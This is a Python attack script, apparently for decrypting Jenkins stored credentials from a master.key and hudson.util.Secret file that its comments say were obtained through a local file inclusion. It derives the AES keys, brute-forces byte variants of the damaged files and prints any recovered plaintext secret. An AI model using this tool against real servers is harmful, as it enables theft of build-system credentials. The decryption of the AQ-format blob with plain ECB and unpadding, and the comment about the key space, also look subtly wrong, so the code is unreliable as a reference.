#!/usr/bin/env python3
import sys
import base64
import hashlib
import itertools
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

def derive_master_aes(master_path):
    with open(master_path, 'rb') as f:
        master_key = f.read().strip()
    return hashlib.sha256(master_key).digest()[:16]

def try_decrypt_blob(master_aes, hudson_bytes, encrypted_b64):
    try:
        # Decrypt hudson to get candidate conf_key (16 bytes)
        cipher = AES.new(master_aes, AES.MODE_ECB)
        decrypted_hudson = cipher.decrypt(hudson_bytes)
        conf_key = decrypted_hudson[:16]

        # Now decrypt the secret blob
        encrypted = base64.b64decode(encrypted_b64)
        cipher = AES.new(conf_key, AES.MODE_ECB)
        decrypted = cipher.decrypt(encrypted)
        unpadded = unpad(decrypted, AES.block_size)
        return unpadded.decode('utf-8', errors='ignore').strip(), conf_key.hex()
    except Exception:
        return None, None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 jenkins_bruteforce.py <master.key> <hudson.trim.bin> <one_AQ_base64_blob>")
        sys.exit(1)

    master_path = sys.argv[1]
    hudson_path = sys.argv[2]
    test_blob = sys.argv[3]

    master_aes = derive_master_aes(master_path)

    with open(hudson_path, 'rb') as f:
        hudson_data = f.read()[:32]
    hudson_data = hudson_data[:len(hudson_data) & ~0xF]  # align

    print("[*] Starting bruteforce on first block of hudson.util.Secret...")
    print("[*] This usually finishes fast (128-bit space with limited guesses)")

    # Try original + common LFI mangling patterns (nulls, replacement chars, small offsets)
    candidates = [hudson_data]
    # Add variations: replace some bytes with 0x00 or common pollution
    for i in range(min(16, len(hudson_data))):
        for replacement in [b'\x00', b'\xff', b'\x3f']:  # null, ff, ?
            variant = hudson_data[:i] + replacement + hudson_data[i+1:]
            candidates.append(variant[:len(variant) & ~0xF])

    found = False
    for idx, candidate in enumerate(candidates):
        plain, key_hex = try_decrypt_blob(master_aes, candidate, test_blob)
        if plain and len(plain) > 2 and not plain.startswith('['):  # heuristic for success
            print(f"\n[+] SUCCESS! Confidentiality key: {key_hex}")
            print(f"[+] Decrypted test secret: {plain}")
            found = True
            break
        if idx % 50 == 0 and idx > 0:
            print(f"  Tried {idx} candidates...")

    if not found:
        print("[-] Bruteforce did not find a working key with this test blob.")
        print("    Try a different base64 blob from your strings output and re-run.")
